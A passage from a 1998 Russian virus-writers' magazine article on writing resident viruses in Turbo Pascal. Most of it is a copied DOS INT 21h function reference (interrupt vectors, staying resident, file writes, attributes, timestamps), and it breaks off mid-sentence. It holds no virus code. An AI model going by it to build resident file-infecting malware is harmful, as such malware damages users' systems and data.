
      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV   1998
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ ▀▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ ▄▄█ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄▄ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
          (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.

                          Резидентные вирусы


1. Резидентность в Турбо-Паскале. Запись на диск из резидента.

        Вообще, честно говоря, писать резиденты на Паскале (я имею
в виду не только вирусы, а резидентные программы вообще) - большой
изврат, ибо жрут они памяти немерянно, в отличие от ассемблерных
братьев, и глючат намного больше, так как при написании обработчика
прерывания на Паскале Вы не имеете понятия о том, какую поебень
вставит в Ваш обработчик компилятор. Из-за этого часто на начальных
стадиях разработки происходят висы, особенно если Вы трогаете
какое-то жизненноважное для системы прерывание, например, 21h
(функции ДОС).
        Посему рекомендуется обработчики прерываний писать по возможности
на Ассемблере. Хотя, если очень извратиться, то и чистый Паскаль
покатит. Но глючно. Я видел резидентный вирус на чистом паскале,
писанный DoubleBoy'ем из Бишкека, но, к сожалению, его сырцы
у меня не сохранились.
        Вообще перед написанием чего-то резидентного очень неплохо
почитать специальную литературу, в которой описывается, что такое
прерывания, таблица этих самых прерываний, как с ими работать
и прочее. К сожалению, я не справочник, посему здесь ничего из
этого приводить не буду - читайте книги. Приведу лишь некоторые
сведения, взятые из справочника Norton Guide "МС-ДОС для программиста",
которые так или иначе могут понадобиться Вам в процессе написания вируса,
да и вообще знать их полезно.

                 INT 1Bh - останов работы с клавиатуры

  Это прерывание вызывается из клавиатурного (INT 09), когда опознается на-
жатие клавиш Ctrl/Break.  Сначала INT 1Bh указывает на IRET, но ДОС инстал-
лирует обработчик, управляющий внутренним флагом, сигнализирующим о нажатии
Ctrl/Break.  В зависимости от статуса Ctrl/Break, установленного вызовом
X'33',  ДОС проверяет его при системных вызовах.

  Определив возникновение Ctrl/Break, ДОС выводит на экран символы ^C,
сбрасывает внутренний флаг и передает управление обработчику INT 23h.

  Флаг в адресе 0:0471 устанавливается обработчиком INT 09 после первого
возникновения Ctrl/Break, но сбросить его вы должны сами. Это дает воз-
можность родительскому процессу установить, что потомок прекратил работу по
Ctrl/Break.

             INT 21h - вызов функций ДОС

  Прерывание предназначено для вызова функций ДОС.  Номер вызываемой функции
устанавливается в регистре AH, в остальные регистры заносятся данные соглас-
но формату конкретно требующейся вам функции, после чего INT 21h передает
управление в ДОС.  После выполнения функции управление возвращается назад.

  В приводимом ниже описании функций все значения приведены в шестнадцати-
ричном виде.

  Для некоторых операций параметр задается в виде строки ASCIIZ. Такой фор-
мат состоит из последовательности символов ASCII, представляющих указатель
устройства (необязательно), составное имя каталога (путь) и (в некоторых
случаях) имя файла.  Строка заканчивается нулевым байтом.

  Например, строка

B:\LEVEL1\LEVEL2\FILE1

за которой следует нулевой байт.  Заметим, что все операции, которые могут
работать с именами каталогов, одинаково интерпретируют символы '/' и '\'.

  Ряд функций помечен как внутренние функции ДОС. Это означает, что
функция является НЕДОКУМЕНТИРОВАННОЙ, и ее использование не рекомендуется,
т.к. нет гарантии, что она на вашей системе будет работать согласно приве-
денному описанию. Впрочем, практика показывает, что недокументированные
функции работают так же, как и документированные.

                     X'0F' - открыть файл

  Вход :AH = 0Fh
       DS:DX - адрес блока управления файлом (FCB)
  Выход:AL = FFh - файл не найден
       AL = 00  - файл найден.

  Выполняется поиск и открытие файла в текущем каталоге.

                     X'10' - закрыть файл

  Вход :AH = 10h
       DS:DX - адрес открытого блока FCB
  Выход:AL = FFh - если ошибка
       AL = 0  - при успешном завершении

  Эта функция должна выполняться после завершения работы с открытым на
запись файлом.

          X'11' - поиск первого элемента (через FCB)

  Вход :AH = 11h
       DS:DX  - адрес неоткрытого блока FCB для файла
  Выход:AL = FFh - элемент не найден
       AL = 0  - при успешном завершении заполненный FCB

  В текущем каталоге осуществляется поиск до первого совпадения имени файла
из FCB с именем файла в каталоге. (имя файла в FCB может содержать
обобщенные символы "?").

  В текущем буфере обмена с диском (DTA) будет сформирована следующая
информация:

- для расширенного FCB:

       В первом байте DTA - FFh, затем 5 байт - 00, затем байт атрибута из
       FCB, затем номер используемого драйвера (1=A, 2=B и т.д.), затем
       элемент каталога длиной 32 байта.

       Если атрибут 0 - поиск только среди обыкновенных файлов.  Если
       атрибут "системный" и/или "невидимый" - поиск по всем обыкновенным
       файлам и по файлам с заданным атрибутом.  Если атрибут "метка тома"
       - возвращается только элемент метки тома.

       Таким образом, DTA будет содержать неоткрытый расширенный блок FCB.

- для обычного FCB:

       В первом байте - номер используемого драйвера (1=A, 2=B и т.д.), и
       следующие 32 байта содержат найденный элемент каталога.

  Таким образом, DTA будет содержать обычный неоткрытый FCB.

         X'12' - поиск следующего элемента (через FCB)

  Вход :AH = 12h
       DS:DX - адрес неоткрытого блока FCB для файла
  Выход:AL = FFh - элемент не найден
       AL = 0  - при успешном завершении заполненный FCB

  После успешного выполнения X'11' может быть вызван X'12' для нахождения
следующего элемента каталога по неоднозначному запросу (символы "?" и "*" в
имени файла).  Область FCB содержит информацию, необходимую для продолжения
поиска.  Никакие другие дисковые операции не должны быть выполнены с этим
FCB между предшествующими вызовами X'11' или X'12' и текущим вызовом.

               X'13' - удалить файл (через FCB)

  Вход :AH = 13h
       DS:DX - адрес неоткрытого блока FCB для файла.
  Выход:AL = FFh - элемент не найден
       AL = 0 - успешном завершении

  Удаляются все соответствующие этому FCB элементы в каталоге.

          X'14' - последовательное чтение (через FCB)

  Вход :AH = 14h
       DS:DX  - адрес открытого FCB
  Выход:AL = 0 - очередная запись считана в DTA
       AL = 1 - данные не считаны, конец файла
       AL = 2 - данные не считаны, достигнут конец сегмента DTA
       AL = 3 - считана неполная запись (конец файла), буфер дополнен
                нулями.

          X'15' - последовательная запись (через FCB)

  Вход :AH = 15h
       DS:DX  - адрес открытого FCB
  Выход:AL = 0 - успех операции
       AL = 1 - данные не записаны, нет дисковой памяти
       AL = 2 - данные не записаны, достигнут конец сегмента DTA

  Если размер записи меньше, чем размер сектора, то записи буферируются в
оперативной памяти до тех пор, пока не будет сформирован сектор, после чего
выполняется запись сектора на диск.


               X'16' - создать файл (через FCB)

  Вход :AH = 16h
       DS:DX - адрес неоткрытого FCB
  Выход:AL = FFh - нет свободных входов в каталоге
       AL = 0 - файл создан и открыт (см. X'0F')

  Если файл с указанным именем существовал ранее, то его длина устанавлива-
ется равной 0. Допускается использование расширенного FCB.


           X'17' - переименование файла (через FCB)

  Вход :AH = 17h
       DS:DX - адрес модифицированного FCB.
  Выход:AL = FFh - нет файла, новое имя существует и другие ошибки
       AL = 0 - успех операции

  В модифицированном FCB должны содержаться номер драйвера и имя файла, а
новое имя файла должно быть расположено по адресу DS:DX + 11h.

  В старом и новом именах файла в модифицированном FCB могут быть использо-
ваны обобщенные символы "?".  Если символ "?" использован в старом имени
файла, то будут переименованы все файлы с именами, соответствующими старому
имени файла в FCB (два файла не могут иметь одно и то же имя и расширение).
Если символ "?"  имеется в новом имени файла в модифицированном FCB, то
соответствующии позиции в исходных именах файлов останутся без изменения.

               X'23' - размер файла (через FCB)

  Вход :AH = 23h
       DS:DX - адрес неоткрытого FCB
  Выход:AL = FFh - файл не найден
       AL = 00  - успех операции.

  В поле "номер записи при прямом доступе" засылается количество записей в
файле (вычисляется на основании значения поля FCB "длина записи", заполнен-
ного перед вызовом).

             X'25' - установить вектор прерывания

  Вход :AH = 25h
       AL   - номер прерывания
       DS:DX - адрес (сегмент:смещение) подпрограммы обработки указанного
               прерывания.

  Этот адрес засылается в соответствующий элемент таблицы векторов
прерываний.


                     X'2A' - получить дату

  Вход :AH = 2Ah
  Выход:CX - год (1980-2099 в двоичном виде)
       DH - месяц (1-январь, 2-февраль и т.д.)
       DL - день (1-31)
       AL - день недели (0-воскресение, ..., 6-суббота).


                    X'2B' - установить дату

  Вход :AH = 2Bh
       CX - год (1980-2099 в двоичном виде)
       DH - месяц (1-январь, 2-февраль и т.д.)
       DL - день (1-31)
  Выход:AL = FFh - ошибка
       AL = 0 - успех операции.


                    X'2C' - получить время

  Вход :AH = 2Ch
  Выход:CH - часы (0-23)
       CL - минуты (0-59)
       DH - секунды (0-59)
       DL - сотые доли секунды (0-99).


                   X'2D' - установить время

  Вход :AH = 2Dh
       CH - часы (0-23)
       CL - минуты (0-59)
       DH - секунды (0-59)
       DL - сотые доли секунды (0-99).
  Выход:AL = FFh - ошибка
       AL = 0  - успех операции.


            X'2F' -  получить текущее значение DTA

  Вход :AH = 2Fh
  Выход:ES:BX - адрес текущего буфера DTA


                   X'30' - номер версии ДОС

  Вход :AH = 30h
  Выход:AL = старшая часть (до точки) номера версии
       AH = младшая часть (после точки) номера версии.
       BX = 0
       CX = 0.

       Примечание:

       Для версий до 2.00 AL=0.  Обнуление регистров в ДОС 2.0 и выше не
       гарантируется.


           X'31' - закончить и остаться резидентным

  Вход :AH = 31h
       AL - код завершения
       DX - размер памяти в 16-байтных параграфах.

  Эта операция завершает выполнение текущего процесса и пытается установить
длину основного блока памяти этого процесса равным указанному в DX.  Никакие
другие блоки памяти, принадлежащие данному процессу (например, захваченные
через X'48'), не освобождаются, открытые файлы не закрываются.  Код за-
вершения доступен родительскому процессу через X'4D', а также команде
ERRORLEVEL в командных файлах.

  Данный вызов предпочтительней, чем INT 27h, которое не выдает кода
завершения и неспособно инсталлировать программу объемом больше, чем 64K.


              X'35' - получить вектор прерывания

  Вход :AH = 35h
       AL - номер прерывания.
  Выход:ES:BX - адрес входа в программу его обработки.


   X'36' - получить размер свободного пространства на диске

  Вход :AH = 36h
       DL - номер драйвера (0 = текущий диск, 1=A и т.д.)
  Выход:AX=0FFFFh, если задан недопустимый номер драйвера.
       AX - число секторов в кластере
       BX - число свободных кластеров на диске
       DX - общее число кластеров на диске
       CX - число байт в секторе.


                  X'39' - создать подкаталог

  Вход :AH = 39h
       DS:DX - адрес строки ASCIIZ с именем драйвера и составным именем
               каталога.
  Выход:AX - код ошибки, если установлен бит переноса.

  Если какой-либо элемент составного имени каталога отсутствует, то не
выполняется никаких действий, иначе создается подкаталог. Новый подкаталог
создается в конце составного имени каталогов.


                  X'3A' - удалить подкаталог

  Вход :AH = 3Ah
       DS:DX - адрес строки ASCIIZ с именем драйвера и составным именем
               каталога.
  Выход:AX - код ошибки, если установлен бит переноса.

  Указанный каталог уничтожается.  Невозможно уничтожить текущий каталог
или каталог, в котором есть файлы или подкаталоги.


              X'3B' - установить текущий каталог

  Вход :AH = 3Bh
       DS:DX - адрес строки ASCIIZ с именем драйвера и составным именем
               каталога.
  Выход:AX - код ошибки, если установлен бит переноса.

  Если какой-либо элемент составного имени отсутствует, то не выполняется
никаких действий, иначе указанный каталог становится текущим.

Информация о возвращаемых ошибках


                     X'3C' - создать файл

  Вход :AH = 3Ch
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
               каталога и именем файла.
       CX - атрибут файла
  Выход:AX - номер канала или код ошибки, если установлен бит переноса

  Эта операция создает новый файл с указанным именем или придает файлу
нулевую длину, если он уже существует.  Файл открывается в режиме доступа
"чтение/запись".

  Количество возможных номеров каналов определяется в CONFIG.SYS (параметр
FILES), а также может изменяться вызовом X'67'.


                     X'3D' - открыть файл

  Вход :AH = 3Dh
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
               каталога и именем файла
       AL - режим открытия.
  Выход:AX - номер канала для открытого файла или код ошибки

  Указатель текущей позиции устанавливается на первый байт файла (его поло-
жение может быть изменено вызовом X'42').  Длина файла устанавливается в
единицу.  Полученный номер канала используется при последующих обращениях к
файлу.  Время и дату создания/модификации файла можно получить вызовом
X'57', а атрибуты - вызовом X'43'.

  Приведем формат байта, заносимого в AL.

  Режимы доступа (используются аналогично в ДОС 2.x и 3.x):
       биты 2 - 0

000 = доступ только для чтения
     Открытие будет успешным, если файл не был ранее открыт в режимах сов-
     местного использования "блокировка чтения" или "блокировка чтения/за-
     писи".

001 = доступ только для записи
     Открытие будет успешным, если файл не был ранее открыт в режимах сов-
     местного использования "блокировка записи" или "блокировка чтения/за-
     писи".

010 = доступ для чтения и записи
     Открытие будет успешным, если файл не был ранее открыт в режимах сов-
     местного использования "блокировка записи", "блокировка чтения" или
     "блокировка чтения/записи".

  Резерв:
       бит 3 = 0

  Режимы совместного использования (ДОС 3.x):
       биты 6 - 4

000 = совместимый режим
     Любой процесс может открыть файл в этом режиме любое количество раз,
     если этот файл не был открыт ранее в одном из четырех режимов, описан-
     ных ниже.  Если файл был ранее открыт в одном из этих режимов, обра-
     ботчик INT 24H сообщит, что устройство не готово, а вызов X'59' вернет
     код ошибки 20h - "нарушение режима совместного использования".

001 = блокировка чтения/записи (исключительный режим)
     Открытие будет успешным, только если файл не был открыт ранее любым
     процессом (включая и текущий) в совместимом режиме совместного исполь-
     зования или режимах доступа чтения или записи.

     Доступ к такому файлу невозможен.  Открытый в этом режиме файл не
     может быть открыт снова в любом режиме совместного использования любым
     процессом (включая текущий), до тех пор, пока он не будет закрыт.

010 = блокировка записи
     Открытие будет успешным, только если файл не открыт ранее любым другим
     процессом в совместимом режиме совместного использования или в режиме
     доступа для записи.

011 = блокировка чтения
     Открытие будет успешным, только если файл не открыт ранее любым другим
     процессом в совместимом режиме совместного использования или в режиме
     доступа для чтения.

100 = "пустая" блокировка
     Открытие будет успешным, только если файл не открыт ранее любым другим
     процессом в совместимом режиме совместного использования.

  В ДОС 3.0 и выше, биты 4, 5 и 6 используются для сетевой работы.  Этими
битами определяются возможности других пользователей работать с открытым
вами файлом.

  Флажок наследования:
       бит 7

0 = файл может наследоваться новым процессом (будет ему доступен)
1 = файл принадлежит текущему процессу

  Таблица возможностей повторного открытия файла:

  Файл открыт в режиме:   Может быть открыт заново в режиме:

Блокировка чтения/записи,  Нельзя открыть повторно
Доступ только для чтения
   (AL=x0010000)

Блокировка чтения/записи,  Нельзя открыть повторно
Доступ только для записи
   (AL=x0010001)

Блокировка чтения/записи,  Нельзя открыть повторно
Доступ для чтения/записи
   (AL=x0010010)

Блокировка записи,         Блокировка записи, только для
Доступ только для чтения   чтения  (AL = x0100000)
   (AL = x0100000)        "Пустая" блокировка, только для
                           чтения  (AL = x1000000)

Блокировка записи,         Блокировка чтения, только для
Доступ только для записи   чтения  (AL = x0110000)
   (AL=x0100001)          "Пустая" блокировка, только для
                           чтения  (AL = x1000000)

Блокировка записи,         "Пустая" блокировка, только для
Доступ для чтения/записи   чтения (AL = x1000000)
   (AL=x0100010)

Блокировка чтения,         Блокировка записи, только для
Доступ только для чтения   записи  (AL = x0100001)
   (AL = x0110000)        "Пустая" блокировка, только для
                           записи  (AL = x1000001)

Блокировка чтения,         Блокировка чтения, только для
Доступ только для записи   записи  (AL = x0110001)
   (AL = x0110001)        "Пустая" блокировка, только для
                           записи  (AL = x1000001)

Блокировка чтения,         "Пустая" блокировка, только для
Доступ для чтения/записи   записи (AL = x1000001)
   (AL = x0110010)

"Пустая" блокировка,       Блокировка записи, только для
Доступ только для чтения   чтения  (AL = x0100000)
   (AL = x1000000)        Блокировка записи, только для
                           записи  (AL = x0100001)
                           Блокировка записи, для
                           чтения/записи  (AL = x0100010)
                           "Пустая" блокировка, только для
                           чтения  (AL = x1000000)
                           "Пустая" блокировка, только для
                           записи  (AL = x1000001)
                           "Пустая" блокировка, для
                           чтения/записи  (AL = x1000010)

"Пустая" блокировка,       Блокировка чтения, только для
Доступ только для записи   чтения  (AL = x0110000)
   (AL = x1000001)        Блокировка чтения, только для
                           записи  (AL = x0110001)
                           Блокировка чтения, для
                           чтения/записи  (AL = x0110010)
                           "Пустая" блокировка, только для
                           чтения  (AL = x1000000)
                           "Пустая" блокировка, только для
                           записи  (AL = x1000001)
                           "Пустая" блокировка, для
                           чтения/записи  (AL = x1000010)

"Пустая" блокировка,       "Пустая" блокировка, только для
Доступ для чтения/записи   чтения  (AL = x1000000)
   (AL = x1000010)        "Пустая" блокировка, только для
                           записи  (AL = x1000001)
                           "Пустая" блокировка, для
                           чтения/записи  (AL = x1000010)

       Примечания:

    1) Эта операция открывает как обычные, так и скрытые файлы. Файлы,
       заканчивающиеся двоеточием, не открываются.

    2) Когда файл закрывается, ограничения на право пользования файлом
       (sharing) снимаются.

    3) Файловое разделение (совместное владение) должно быть загружено
       (утилита SHARE) до использования режимов пользования файлом.

    4) Атрибут файла только для чтения может быть установлен при создании
       файла (используя расширенный FCB) или при использовании соответству-
       ющего атрибута в CX (вызовы X'16' или X'3C'), или вызовом X'43'
       или утилитой ATTRIB.

    5) Все ограничения на права пользования файлом наследуются, если файл
       наследуется новым процессом.

    6) Если номер канала при открытии дублируется (вызовом X'45' или
       X'46'), то совместное владение и ограничения на доступ также
       дублируются.


                     X'3E' - закрыть файл

  Вход :AH = 3Eh
       BX - номер канала.
  Выход:AX - код ошибки, если установлен бит переноса.

  Системные буфера, связанные с файлом, сбрасываются, каталог корректиру-
ется и файл закрывается.

  Отметим, что ввиду ограниченного количества номеров каналов в системе (8
по умолчанию и не более 255) вы можете закрыть назначенные по умолчанию (на-
пример, файл с каналом 3 для обмена с асинхронным адаптером).


                   X'3F' - чтение из файла

  Вход :AH = 3Fh
       BX - номер канала,
       CX - число байт для чтения,
       DS:DX - адрес буфера.
  Выход:AX - число фактически прочитанных байт или код ошибки, если
             установлен бит переноса

  Операция читает указанное количество байт, начиная с текущей позиции и
помещает их в указанный буфер.  Указатель текущей позиции корректируется.

  Вы всегда должны сравнить полученное в AX значение с указанным вами в CX:
 AX = CX и флаг переноса не установлен - успешно прочитано указанное
     количество байт;
 AX = 0 - достигнут конец файла;
 AX меньше CX (но не 0):
       - если чтение с устройства (клавиатуры), то считана строка с длиной
         AX, причем код "возврата каретки" 0D также учитывается;
       - если чтение файла, то после считывания AX байт достигнут конец
         файла.


                     X'40' - запись в файл
  Вход :AH = 40h
       BX - номер канала,
       CX - число записываемых байт,
       DS:DX - адрес  буфера.
  Выход:AX - количество фактически записанных байт или код ошибки, если
            установлен бит переноса

  Запись в файл производится начиная с текущей позиции, указатель текущей
позиции сдвигается на число записанных байт.

  Вы всегда должны сравнить полученное в AX значение с указанным вами в CX:
 AX = CX и флаг переноса не установлен - успешно записано указанное
     количество байт;
 AX меньше CX - ошибка (обычно переполнение диска).

       Примечание:

       Если вы пишете в ранее существовавший файл, то ДОС увеличит его раз-
       мер, если вами будет произведена запись в конец файла. Если новая
       версия файла будет иметь меньшую длину (усечение файла), то необхо-
       димо сообщить об этом ДОС следующим образом: сначала установить
       вызовом X'42' указатель на конец файла, затем записать в него 0
       байт данным вызовом X'40'.


          X'41' - удалить файл из указанного каталога

  Вход :AH = 41h
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
               каталога и именем файла.
  Выход:AX - код ошибки, если установлен бит переноса.

  Имя не должно содержать символов поиска ("*" и "?").  Операция удаляет
указанный файл.  Она не может удалить файл, имеющий атрибут "только для
чтения".  Для удаления такого файла необходимо предварительно изменить его
атрибуты вызовом X'43'.


          X'42' - изменить указатель текущей позиции

  Вход :AH = 42h
       BX - номер канала,
       CX:DX - расстояние, на которое перемещается указатель текущей
               позиции (старшая часть - в CX).
       AL = 0 - указатель устанавливается на начало файла плюс CX:DX
                (смещение)
       AL = 1 - указатель устанавливается на текущую позицию плюс смещение
       AL = 2 - указатель устанавливается на конец файла плюс смещение.
  Выход:DX:AX - новая текущая позиция (старшая часть - в DX)
          или
       AX - код ошибки, если установлен бит переноса.

  Текущая позиция определяет номер байта в файле, для которого будет вы-
полняться следующая операция обмена.

       Замечание:

       Вызов с параметрами  AL = 2, CX = 0, DX = 0 возвращает в DX:AX длину
       файла.


           X'43' - получить/изменить атрибуты файла

  Вход :AH = 43h
       AL = 00 - получить атрибуты файла в CX
       AL = 01 - задать файлу атрибуты, указанные в CX.
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
               каталога и именем файла.
       CX - атрибуты файла (для AL = 1)
  Выход:AX - код ошибки, если установлен бит переноса.
       CX - текущие атрибуты файла (для AL = 0)


                X'47' - выдать текущий каталог

  Вход :AH = 47h
       DL - номер драйвера (0 = текущий диск, 1=A и т.д.),
       DS:SI - адрес буфера для записи полного составного имени текущего
               каталога (64 байта длиной).
  Выход:AX - код ошибки, если установлен бит переноса.

  Строка начинается с первой буквы подкаталога в корневом каталоге и
заканчивается нулевым байтом.

       Примечания:

    1) Имя драйвера и начальный символ '\' не входят в полное имя каталога;

    2) Если текущий каталог - корневой, то возвращается строка из одного
       нулевого байта.

Информация о возвращаемых ошибках


           X'4B' - загрузить или выполнить программу

  Вход :AH = 4Bh
         Код подфункции:
            AL=0 - загрузить и выполнить,
            AL=1 - загрузить и не выполнять (внутренняя ДОС),
            AL=3 - загрузить программный оверлей.
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
               каталога и именем файла, содержащего загружаемую задачу,
       ES:BX - адрес блока параметров для загрузчика.
  Выход:AX - код ошибки, если установлен бит переноса.

  Эта операция позволяет одной программе загрузить другую и, если не
указано иначе, начать ее выполнение.

AL = 0 загрузить и выполнить программу.
---------------------------------------

  Для загруженной программы создается префикс программного сегмента (PSP),
в котором вектора завершения и выхода по Ctrl/Break, установлены на возврат
управления в родительский процесс, непосредственно после вызова X'4B'.

  Все открытые файлы родительского процесса дублируются в процессе, созда-
ваемом этой вызовом под теми же номерами каналов, кроме файлов, открытых с
установкой флажка наследования.  Это позволяет родительской задаче задавать
вызываемой задаче файлы для стандартного ввода, стандартного вывода, комму-
никаций и печати.  Например, родительская задача может написать несколько
записей в файл, затем открыть этот файл как стандартный ввод, открыть другой
файл как стандартный вывод (вызовом X'46'), и вызвать программу сортировки,
которая читает из стандартного ввода и пишет результаты в стандартный вывод.

  Вызываемая задача получает от родительской также копию среды ДОС, если не
указан новый адрес среды.

  Формат блока параметров:
Смещ  длина
 +0   2    адрес сегмента передаваемой среды (для унаследования текущей -
            0000)
 +2   4    адрес командной строки, помещаемой в PSP+80h
 +6   4    адрес 1-го FCB, помещаемый в PSP+5Ch
 +0Ah  4    адрес 2-го FCB, помещаемый в PSP+6Ch
  Общая длина блока параметров - 0Eh.

       Примечания:

    1) Если командная строка не требуется, то по смещению +2 поместите
       адрес строки из 2-х байт - 00h, 0Dh.

    2) Если не требуются FCB, то соответствующие строки блока параметров
       можно не устанавливать.

  Поскольку родительская задача получила всю имевшуюся память, вы должны
освободить вызовом X'4A' часть памяти перед выдачей X'4B'.  Стандарт-
ная последовательность ваших действий:

    1) Вызвать X'4A' с параметрами ES = сегмент PSP и BX = минимально
       необходимый размер памяти в параграфах;

    2) Подготовить строку ASCIIZ с именем файла программы и ее адрес
       занести в DS:DX;

    3) Подготовить блок параметров описанного выше формата;

    4) Выполнить X'4B' с AL = 0;

    5) Проверить бит переноса, не выдал ли X'4B' ошибки;

    6) Вызовом X'4D' получить, если хотите, код возврата.

  После выхода вектора INT 22h, 23h и 24h восстанавливаются.

       Примечание:

       Некоторые версии ДОС ранее не сохраняли после вызова X'4B'
       содержимого ES, DS, SS и SP, в ДОС 3.3 их содержимое сохраняется.

AL = 1 загрузить и не выполнять.
--------------------------------

  Данная подфункция является ВНУТРЕННЕЙ для ДОС 3.x и отличается от
подфункции 0 тем, что управление загруженной задаче не передается.  Блок
параметров выглядит следующим образом:

Смещ  длина
Вход :
 +0   2    адрес сегмента передаваемой среды (для унаследования текущей -
            0000)
 +2   4    адрес командной строки, помещаемой в PSP+80h
 +6   4    адрес 1-го FCB, помещаемый в PSP+5Ch
+0Ah  4    адрес 2-го FCB, помещаемый в PSP+6Ch
Выход:
 +0Eh  4    содержимое регистров SS:SP
 +12h  4    содержимое регистров CS:IP (адрес запуска программы)

AL = 3 загрузить.
-----------------

  Эта подфункция полезна для формирования перекрытий (оверлеев).

  Формат блока параметров:
Смещ  длина
 +0   2    адрес сегмента, куда загружается файл
 +2   2    адрес, на который настраивается загружаемая задача


                  X'4C' - завершение процесса

  Вход :AH = 4Ch
       AL - код возврата.

  Операция заканчивает выполнение текущего процесса и передает управление
его родителю.  При этом выдается указанный код возврата, который может
анализироваться командами IF и ERRORLEVEL в командных файлах и операцией
X'4D' в родительской задаче.  Все файлы, открытые заканчивающейся задачей,
закрываются.


       X'4E' - найти первый элемент каталога по образцу

  Вход :AH = 4Eh
       DS:DX - адрес строки ASCIIZ с полным именем файла.
       CX - атрибуты  файла.
  Выход:AX - код ошибки, если установлен бит переноса.

  Имя файла может содержать символы поиска "?" и "*".

  Если файл с составным именем, удовлетворяющим образцу, найден, то буфер
DTA заполняется следующим образом:

смещ  длина
 +0  15h   используется для последующих обращений;
+15h  1    атрибуты найденного  элемента каталога;
+16h  2    время создания или модификации;
+18h  2    дата создания или модификации;
+1Ah  4    двойное слово - длина файла;
+1Eh  0Dh   имя с расширением из найденного элемента каталога в виде
            ASCIIZ. Из имени удалены пробелы, возвращаемое имя легко можно
            использовать для дальнейших вызовов. Необходимый размер буфера
            - 2Ch байт.


      X'4F' - найти следующий элемент каталога по образцу

  Вход :AH = 4Fh
       буфер DTA должен быть заполнен предыдущим обращением к операции
       X'4E'.
  Выход:AX - код ошибки, если установлен бит переноса.

  Операция заносит в DTA информацию о следующем найденном элементе
каталога.  Если такой элемент не найден, возвращается код ошибки.


         X'51' - получить сегмент PSP (внутренняя ДОС)

  Вход :AH = 51h
  Выход:BX - текущий сегмент PSP

       Примечание:

       Для ДОС 2.x, данная функция не может быть вызвана внутри обработчика
       INT 28h без установки флажка критической ошибки.


            X'56' - переименовать/переместить файл

  Вход :AH = 56h
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
               каталога и именем файла, который необходимо переименовать.
       ES:DI - адрес строки ASCIIZ, содержащую новое составное имя файла.
  Выход:AX - код ошибки, если установлен бит переноса.

  Если новое имя содержит имя драйвера, оно должно совпадать с драйвером в
старом имени.  Имена каталогов могут отличаться, что позволяет этой вызовом
не только переименовать файл, но и переместить его в другой каталог.  Обоб-
щенные символы использовать нельзя.


        X'57' - дата и время создания/модификации файла

  Вход :AH = 57h
       BX - номер канала,
       AL=00 - то в DX и CX возвращаются дата и время создания/модификации
               файла из каталога.
       AL=01 - то в каталог заносятся дата и время создания/модификации
               файла из DX и CX.
  Выход:AX - код ошибки, если установлен бит переноса.


                  X'5B' - создать новый файл

  Вход :AH = 5Bh
       DS:DX - адрес строки ASCIIZ с именем драйвера, составным именем
            каталога и именем файла;
       CX -  атрибут файла.
  Выход:AX - номер открытого файла или код ошибки, если установлен
            бит переноса.

  Этот вызов аналогичен вызову X'3C' за исключением того, что X'5B' воз-
вращает ошибку, если файл уже существует.  Если опущены имя драйвера и/или
путь каталогов, то берутся текущие.  Файл создается в "совместимом" режиме
для чтения и записи.


        X'60' - получение полного пути (внутренняя ДОС)

  Вход :AH = 60h
       DS:SI - строка относительного пути
       ES:DI - буфер для полного имени
  Указанный буфер заполняется полным (квалифицированным) именем.


     X'62' - получить адрес префикса программного сегмента

  Вход :AH = 62h
  Выход:BX - адрес сегмента, по которому находится префикс программного
            сегмента текущего выполняемого процесса.

  Используйте этот вызов для получения адреса строки параметров, адреса
среды ДОС и другой полезной вам информации из префикса программного
сегмента.


                        Информация о возвращаемых ошибках

  Многие операции очищают флаг переноса, если операция выполнена успешно.
При возникновении ошибки флаг переноса устанавливается (CF=1), и AX содержит
код ошибки:

            Для ДОС версии 2.0 и более поздних:
        1  ошибка номера функции
        2  нет файла
        3  нет указанного пути
        4  слишком много открытых файлов
        5  отказ в доступе
        6  ошибка номера файла
        7  разрушен блок управления памятью
        8  недостаточно памяти
        9  ошибка адреса блока памяти
       0Ah  ошибка оборудования
       0Bh  ошибка формата
       0Ch  ошибка кода доступа
       0Dh  ошибка данных
       0Eh  (не используется)
       0Fh  ошибка имени диска
       10h  нельзя удалять текущий каталог
       11h  не то же самое устройство
       12h  нет больше совпадающих файлов

                  Для ДОС версий 3.x:
       13h  попытка записи на защищенный диск
       14h  неизвестный идентификатор драйвера
       15h  не готов диск
       16h  неизвестная команда
       17h  ошибка данных на диске (ошибка CRC)
       18h  ошибочная длина структуры запроса
       19h  ошибка выбора дорожки на диске
       1Ah  неизвестный тип формата диска
       1Bh  не найден сектор на диске
       1Ch  нет бумаги на принтере
       1Dh  ошибка записи на диск
       1Eh  ошибка чтения с диска
       1Fh  общая ошибка
     Перечисленные выше 13h-1Fh ошибки соответствуют 0-0Ch ошибкам, переда-
     ваемым в DI обработчику ошибок INT 24h.  Они также совпадают со
     значениями, возвращаемыми в AL в случае ошибки после INT 25h/26h.

       20h  нарушение режима доступа к файлу
       21h  нарушение блокировки файла
       22h  ошибка смены диска
       23h  слишком много FCB
       24h-49h резерв
       50h  файл уже существует
       51h  резерв
       52h  нельзя сделать (??)
       53h  сбой обработчика INT 24h

  Для получения более подробной информации об ошибках, такой как информация
о классе ошибки, ее локализация и рекомендаций по ее устранению, можно вос-
пользоваться системным вызовом X'59'.  При этом вызов X'59' возвращает ин-
